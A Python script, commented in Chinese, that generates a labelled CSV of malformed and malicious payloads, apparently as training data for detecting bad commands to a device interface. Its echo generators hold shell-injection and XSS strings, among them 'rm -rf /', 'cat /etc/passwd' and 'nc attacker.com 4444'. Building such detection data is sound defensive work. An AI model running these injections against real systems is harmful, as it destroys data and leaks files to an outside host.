# generate_malicious_only.py
# 只負責產生「惡意 / 格式錯誤 payload」，不依賴舊 dataset

import csv
import random

OUT_PATH = "malicious_only.csv"
N_PER_TYPE = 400  # 每一種型態要幾筆，可以自己調

# --------- 產生各種壞 payload ---------

def gen_bad_run_cmd_add_sub():
    """run_cmd, ADD / SUB：參數錯誤 & op 拼錯"""
    rows = []

    # 1) ADD / SUB 參數個數錯誤（3 個數字）
    for _ in range(N_PER_TYPE):
        a = random.randint(-100, 100)
        b = random.randint(-100, 100)
        c = random.randint(-100, 100)
        rows.append([f"run_cmd, ADD {a} {b} {c}", "malicious", "cmd_parse_error"])

    for _ in range(N_PER_TYPE):
        a = random.randint(-100, 100)
        b = random.randint(-100, 100)
        c = random.randint(-100, 100)
        rows.append([f"run_cmd, SUB {a} {b} {c}", "malicious", "cmd_parse_error"])

    # 2) 非整數參數
    bad_tokens = ["X", "abc", "1.5", "NaN"]
    for _ in range(N_PER_TYPE):
        a = random.randint(-100, 100)
        x = random.choice(bad_tokens)
        rows.append([f"run_cmd, ADD {a} {x}", "malicious", "cmd_parse_error"])

    for _ in range(N_PER_TYPE):
        a = random.randint(-100, 100)
        x = random.choice(bad_tokens)
        rows.append([f"run_cmd, SUB {a} {x}", "malicious", "cmd_parse_error"])

    # 3) 拼錯 op：特別加上 AD、SU
    wrong_ops = ["AD", "SU", "ADDd", "PLUS", "SUM", "SUBB"]
    for _ in range(N_PER_TYPE):
        a = random.randint(-100, 100)
        b = random.randint(-100, 100)
        op = random.choice(wrong_ops)
        rows.append([f"run_cmd, {op} {a} {b}", "malicious", "cmd_parse_error"])

    return rows


def gen_bad_run_cmd_echo():
    """run_cmd, echo 後面帶 shell injection"""
    rows = []
    inj_patterns = [
        "hello; rm -rf /",
        "status | cat /etc/passwd",
        "ping 8.8.8.8 && reboot",
        "check $HOME > /tmp/leak",
        "user `whoami`",
        "ls > out.txt && cat out.txt",
        "sensor | nc attacker.com 4444",
        "ok && echo hacked",
    ]
    for _ in range(N_PER_TYPE):
        p = random.choice(inj_patterns)
        rows.append([f"run_cmd, echo {p}", "malicious", "cmdi"])
    return rows


def gen_bad_echo():
    """echo, ... 惡意（帶 shell 字元或 XSS）"""
    rows = []
    inj_patterns = [
        "hello; rm -rf /",
        "hi && shutdown now",
        "test | nc attacker.com 4444",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "name=$USER; id",
        "ok `whoami` && id",
        "value > /tmp/leak",
    ]
    for _ in range(N_PER_TYPE):
        p = random.choice(inj_patterns)
        rows.append([f"echo, {p}", "malicious", "cmdi"])
    return rows


def gen_bad_start_temp_report():
    """start_temp_report 參數不是合法正整數"""
    rows = []
    bad_vals = ["abc", "1.5", "-3.2", "NaN", "five", "0", "-1"]
    for _ in range(N_PER_TYPE):
        v = random.choice(bad_vals)
        rows.append([f"start_temp_report, {v}", "malicious", "temp_report_error"])
    return rows


def gen_bad_misspelled_cmd():
    """像 run, ech, eco 這種拼錯指令（也是格式錯誤）"""
    rows = []
    for _ in range(N_PER_TYPE):
        a = random.randint(-50, 50)
        b = random.randint(-50, 50)
        cmd = random.choice(["run", "rn_cmd", "ech", "eco", "runcmd"])
        if cmd.lower().startswith("ech"):  # ech, hello world
            rows.append([f"{cmd}, hello world", "malicious", "cmd_parse_error"])
        else:
            rows.append([f"{cmd}, ADD {a} {b}", "malicious", "cmd_parse_error"])
    return rows


# --------- 主程式：只輸出惡意 rows ---------

def main():
    rows = []
    rows += gen_bad_run_cmd_add_sub()
    rows += gen_bad_run_cmd_echo()
    rows += gen_bad_echo()
    rows += gen_bad_start_temp_report()
    rows += gen_bad_misspelled_cmd()

    print(f"[info] total generated malicious rows: {len(rows)}")

    with open(OUT_PATH, "w", encoding="utf-8", newline="") as f:
        w = csv.writer(f)
        w.writerow(["payload", "label", "attack_type"])
        w.writerows(rows)

    print(f"[ok] wrote {OUT_PATH}")


if __name__ == "__main__":
    main()
